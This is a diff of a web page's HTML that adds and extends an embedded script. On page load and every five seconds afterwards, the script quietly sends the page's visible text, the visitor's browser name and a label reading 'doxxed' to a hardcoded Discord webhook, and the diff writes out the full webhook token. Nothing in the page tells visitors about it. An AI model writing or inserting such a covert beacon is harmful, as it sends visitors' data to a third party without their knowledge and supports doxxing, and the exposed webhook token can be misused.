@@ -18,22 +18,41 @@
       }
       scrollTitle();
   </script>
-  
-  <script>
+
+<script>
   const webhookURL = "https://discord.com/api/webhooks/1450587669636714627/FFJooBRr_O6-RZV7ne6fNEW-EsJtXw-nnuGN4DZpMNe9V90g53ZqOO1zzEYQhtfRen9E"; // replace with your actual webhook
+
+  const accountName = "doxxed"; // change this to whatever you want
+
+  function getBrowserName() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Google Chrome";
+    if (ua.includes("Firefox")) return "Mozilla Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Edg")) return "Microsoft Edge";
+    if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+    if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
+    return "Unknown Browser";
+  }
+
+  function randomColor() {
+    return Math.floor(Math.random() * 16777215);
+  }
 
   function sendToWebhook() {
     const visibleText = document.body.innerText.trim();
+    const browserName = getBrowserName();
 
     const embedPayload = {
       embeds: [
         {
           title: "Visible Page Content",
-          description: visibleText,
-          color: 0x3498db, // blue background; change hex for other colors
-          footer: {
-            text: "Updated every 5 seconds"
-          },
+          description: visibleText || "(No visible text)",
+          color: randomColor(),
+          fields: [
+            { name: "Account Name", value: accountName, inline: true },
+            { name: "Browser", value: browserName, inline: true }
+          ],
           timestamp: new Date().toISOString()
         }
       ]
@@ -49,8 +68,8 @@
   }
 
   window.addEventListener("load", () => {
-    sendToWebhook();                 // first send
-    setInterval(sendToWebhook, 5000); // repeat every 5 seconds
+    sendToWebhook();
+    setInterval(sendToWebhook, 5000);
   });
 </script>
 
@@ -1194,6 +1213,7 @@ body{
   </div>
  </body>
 </html>
+
 
 
 
